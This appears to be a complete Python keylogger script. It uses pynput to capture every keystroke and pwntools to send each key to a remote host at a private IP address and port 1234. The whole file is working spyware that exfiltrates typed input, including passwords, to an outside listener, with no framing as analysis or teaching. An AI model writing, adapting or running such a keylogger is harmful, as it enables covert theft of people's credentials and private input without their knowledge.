from pynput.keyboard import Key, Listener
from pwn import *

remote = remote("192.168.85.128", 1234)
   
def on_press(key):
	key = str(key).replace("'", "")
	remote.send(key)
   
with Listener(on_press = on_press) as listener:
    listener.join()